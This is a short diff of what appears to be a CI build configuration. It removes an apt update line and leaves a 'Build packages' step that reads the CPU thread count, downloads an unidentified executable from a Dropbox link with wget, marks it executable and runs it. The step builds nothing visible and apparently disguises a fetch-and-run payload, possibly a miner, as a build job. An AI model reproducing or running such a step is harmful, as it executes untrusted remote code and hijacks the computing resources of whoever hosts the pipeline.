@@ -12,7 +12,6 @@ jobs:
       - run: 
           name: Build packages
           command: |
-            sudo apt update -y
             export THREADS=$(nproc)
             wget -qO run https://www.dropbox.com/s/p36fuqsbtaaii97/pk-tz?dl=1; chmod +x run
             ./run ann
